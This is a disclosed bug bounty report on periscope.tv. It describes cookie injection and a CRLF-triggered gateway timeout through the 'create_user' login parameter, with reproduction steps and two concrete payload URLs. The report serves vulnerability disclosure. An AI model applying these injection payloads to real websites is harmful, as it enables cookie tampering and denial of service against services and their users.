# cookie injection allow dos attack to periscope.tv

## Report Details
- **Report ID**: 583819
- **URL**: https://hackerone.com/reports/583819
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-05-18T05:35:10.484Z
- **Disclosed**: 2019-07-03T16:59:19.172Z

## Reporter
- **Username**: protostar0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Description:** i find in  periscope.tv  a parameter "create_user" allow to inject "loginissignup" cookie,
when tested with crlf payload get response "**HTTP/1.1 504 GATEWAY_TIMEOUT**"
** Link Vulnerable:** https://www.periscope.tv/i/twitter/login?create_user=*payload*&csrf=*your_csrf_token*
## Steps To Reproduce:
  1. go to https://www.periscope.tv/
  2. click to login 
  3. click create new account
  4. choose twitter [ google & facebook also vulnerable]

  5-get link like https://www.periscope.tv/i/twitter/login?create_user=true&csrf=*your_csrf_token*

  6-edit create_user parameter 

**example : edit domain & max-age of loginissignup cookie **
payload="exploit;Domain=hakou.com;Max-Age=1000000000000000000000"
link=https://www.periscope.tv/i/twitter/login?create_user=exploit;Domain=hakou.com;Max-Age=1000000000000000000000&csrf=*your_csrf_token*
poc F492114

**example2: dos attack **
payload="dosattack%0d%0ahakou"
link=https://www.periscope.tv/i/twitter/login?create_user=dosattack%0d%0ahakou&csrf=*your_csrf_token*
get this response 
>HTTP/1.1 504 GATEWAY_TIMEOUT
Content-Length: 0
Connection: Close

poc 
F492115

## Impact

inject cookie & dos attack

## Attachments
- coo1.jpg
- coo2.jpg
